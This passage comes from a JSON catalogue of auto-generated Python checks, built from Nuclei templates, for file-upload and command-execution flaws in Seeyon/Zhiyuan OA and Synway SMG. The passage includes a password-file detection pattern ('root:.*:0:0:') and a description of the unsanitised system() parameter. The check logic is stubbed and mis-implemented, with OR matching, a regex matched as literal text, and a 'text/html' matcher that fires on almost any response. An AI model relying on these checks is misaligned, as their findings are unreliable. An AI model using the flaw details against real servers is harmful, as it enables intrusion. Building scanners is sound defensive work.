          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: seeyon-oa-sp2-file-upload\nName: Seeyon OA wpsAssistServlet - Arbitrary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in the Seeyon OA wpsAssistServlet interface. Through the vulnerability, an attacker can send a specific request packet to upload malicious files and obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_seeyon_oa_sp2_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"seeyon-oa-sp2-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Seeyon OA wpsAssistServlet - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"success\":\\' | mot(s) \\'{{string}}\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"success\":', '{{string}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Seeyon OA wpsAssistServlet - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_seeyon_oa_sp2_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: seeyon-oa-sp2-file-upload\nName: Seeyon OA wpsAssistServlet - Arbitrary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in the Seeyon OA wpsAssistServlet interface. Through the vulnerability, an attacker can send a specific request packet to upload malicious files and obtain server permissions.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_seeyon_oa_sp2_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"seeyon-oa-sp2-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Seeyon OA wpsAssistServlet - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"success\":\\' | mot(s) \\'{{string}}\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"success\":', '{{string}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Seeyon OA wpsAssistServlet - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_seeyon_oa_sp2_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "seeyon",
          "oa",
          "file-upload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_zhiyuan_file_upload",
        "name": "Zhiyuan OA Arbitrary File Upload Vulnerability",
        "language": "Python",
        "famille": "WebApp",
        "description": "A vulnerability in Zhiyuan OA allows remote unauthenticated attackers to upload arbitrary files to the remote server and cause execute arbitrary code to be executed.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'java.lang.NullPointerException:null' | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: zhiyuan-file-upload\nName: Zhiyuan OA Arbitrary File Upload Vulnerability\nSeverity: critical\nDescription: A vulnerability in Zhiyuan OA allows remote unauthenticated attackers to upload arbitrary files to the remote server and cause execute arbitrary code to be executed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_zhiyuan_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"zhiyuan-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Zhiyuan OA Arbitrary File Upload Vulnerability\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'java.lang.NullPointerException:null' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['java.lang.NullPointerException:null', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Zhiyuan OA Arbitrary File Upload Vulnerability\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_zhiyuan_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: zhiyuan-file-upload\nName: Zhiyuan OA Arbitrary File Upload Vulnerability\nSeverity: critical\nDescription: A vulnerability in Zhiyuan OA allows remote unauthenticated attackers to upload arbitrary files to the remote server and cause execute arbitrary code to be executed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_zhiyuan_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"zhiyuan-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Zhiyuan OA Arbitrary File Upload Vulnerability\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'java.lang.NullPointerException:null' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['java.lang.NullPointerException:null', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Zhiyuan OA Arbitrary File Upload Vulnerability\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_zhiyuan_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "zhiyuan",
          "rce",
          "fileupload",
          "seeyon",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_sanhuismg_radius_rce",
        "name": "Synway SMG Gateway 9-2radius.php - Remote Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius.php, where the radius_address parameter is passed to a system() call without sanitization. This allows unauthenticated attackers to execute arbitrary commands on the server.",
        "severity": "critical",
        "detection": "[OR] regex ['root:.*:0:0:']",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sanhuismg-radius-rce\nName: Synway SMG Gateway 9-2radius.php - Remote Command Execution\nSeverity: critical\nDescription: Synway SMG Gateway Management Software contains a remote command execution vulnerability in 9-2radius.php, where the radius_address parameter is passed to a system() call without sanitization. This allows unauthenticated attackers to execute arbitrary commands on the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sanhuismg_radius_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sanhuismg-radius-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Synway SMG Gateway 9-2radius.php - Remote Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] regex ['root:.*:0:0:']\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Synway SMG Gateway 9-2radius.php - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sanhuismg_radius_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
